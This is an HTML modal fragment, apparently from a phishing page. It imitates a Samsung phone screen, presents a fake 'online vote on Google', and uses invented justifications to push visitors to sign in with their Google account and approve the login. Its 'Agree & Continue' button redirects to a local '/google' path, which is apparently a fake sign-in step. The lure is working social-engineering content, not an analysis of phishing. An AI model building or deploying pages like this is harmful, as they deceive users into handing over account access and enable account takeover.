<div id="googleModal" class="modal-overlay" style="display: none;">
    <style>
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 99999 !important;
            padding: 10px;
        }

        .phone-container {
            position: relative;
            width: 340px;
            height: 680px;
            max-width: 90vw;
            max-height: 90vh;
            background: #000;
            border-radius: 40px;
            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.3);
            padding: 20px;
            overflow: hidden;
            animation: modalSlideIn 0.3s ease-out;
            z-index: 100000 !important;
        }

        @media (max-width: 768px) {
            .phone-container {
                width: 300px;
                height: 600px;
                padding: 15px;
            }
        }

        @media (max-width: 480px) {
            .phone-container {
                width: 280px;
                height: 560px;
                padding: 12px;
            }
        }

        @media (max-height: 700px) {
            .phone-container {
                height: 85vh;
            }
        }

        @keyframes modalSlideIn {
            from {
                transform: scale(0.8);
                opacity: 0;
            }
            to {
                transform: scale(1);
                opacity: 1;
            }
        }

        .phone-screen {
            width: 100%;
            height: 100%;
            background: #f8f9fa;
            border-radius: 30px;
            overflow: hidden;
            position: relative;
            display: flex;
            flex-direction: column;
            padding: 25px;
        }

        @media (max-width: 480px) {
            .phone-screen {
                padding: 20px;
            }
        }

        .phone-notch {
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 50%;
            height: 25px;
            background: #000;
            border-radius: 0 0 15px 15px;
            z-index: 10;
        }

        .phone-content {
            flex: 1;
            overflow-y: auto;
            padding: 10px 5px;
        }

        .welcome-title {
            text-align: center;
            font-size: 22px;
            font-weight: 700;
            margin: 15px 0 25px;
            color: #1a73e8;
        }

        @media (max-width: 480px) {
            .welcome-title {
                font-size: 18px;
                margin: 10px 0 20px;
            }
        }

        .welcome-text {
            font-size: 16px;
            line-height: 1.6;
            color: #444;
            margin-bottom: 25px;
            text-align: justify;
        }

        @media (max-width: 480px) {
            .welcome-text {
                font-size: 14px;
                margin-bottom: 20px;
            }
        }

        .notification-icon {
            text-align: center;
            font-size: 28px;
            margin: 15px 0;
        }

        @media (max-width: 480px) {
            .notification-icon {
                font-size: 24px;
                margin: 10px 0;
            }
        }

        .agree-button {
            display: block;
            width: 80%;
            margin: 20px auto 0;
            padding: 14px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
            box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
        }

        .loading-icon {
            display: none;
            width: 16px;
            height: 16px;
            border: 2px solid transparent;
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
        }

        .agree-button.loading .loading-icon {
            display: inline-block;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 480px) {
            .agree-button {
                padding: 12px;
                font-size: 14px;
                margin-top: 15px;
            }
        }

        .agree-button:hover {
            background: #0d62c9;
            transform: translateY(-2px);
        }

        .agree-button:active {
            transform: translateY(0);
        }

        .phone-footer {
            text-align: center;
            padding: 15px 0;
            color: #888;
            font-size: 14px;
        }

        @media (max-width: 480px) {
            .phone-footer {
                padding: 10px 0;
                font-size: 12px;
            }
        }

        .decoration {
            position: absolute;
            opacity: 0.05;
            font-size: 100px;
            z-index: 0;
        }

        .decoration-1 {
            top: 50px;
            right: -20px;
            transform: rotate(25deg);
        }

        .decoration-2 {
            bottom: 100px;
            left: -30px;
            transform: rotate(-15deg);
        }

        @media (max-width: 480px) {
            .decoration {
                font-size: 80px;
            }
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin: 15px 0;
            color: #0f9d58;
            font-weight: 500;
        }

        @media (max-width: 480px) {
            .security-badge {
                gap: 8px;
                margin: 12px 0;
                font-size: 14px;
            }
        }

        .samsung-logo {
            text-align: center;
            font-weight: bold;
            color: #1428a0;
            margin-bottom: 10px;
            font-size: 18px;
        }

        @media (max-width: 480px) {
            .samsung-logo {
                font-size: 16px;
                margin-bottom: 8px;
            }
        }
    </style>

    <div class="phone-container">
        <div class="phone-notch"></div>
        <div class="phone-screen">
            <div class="decoration decoration-1">✓</div>
            <div class="decoration decoration-2">🔔</div>

            <div class="samsung-logo">SAMSUNG</div>

            <div class="phone-content">
                <h1 class="welcome-title">Welcome to the online vote on Google.</h1>

                <p class="welcome-text">
                    To continue, you must sign in with your email. You're about to sign in to your Google Account on a Samsung device, because this event is powered by Samsung. After signing in, you will need to approve the login through your email. This step is required to confirm it's really you, to prevent multiple or bot votes, and so that you can receive email notifications when we announce the winner.
                </p>
            </div>

            <button class="agree-button" onclick="proceedToGoogle()">
                <span class="loading-icon"></span>
                Agree&nbsp;& Continue
            </button>

            <div class="phone-footer">
                Secure & Verified | Powered by Samsung
            </div>
        </div>
    </div>

    <script>
        function closeGoogleModal() {
            document.getElementById('googleModal').style.display = 'none';
        }

        function proceedToGoogle() {
            const button = document.querySelector('.agree-button');
            button.classList.add('loading');
            window.location.href = '/google';
        }

        // Close modal when clicking outside
        document.getElementById('googleModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeGoogleModal();
            }
        });
    </script>
</div>
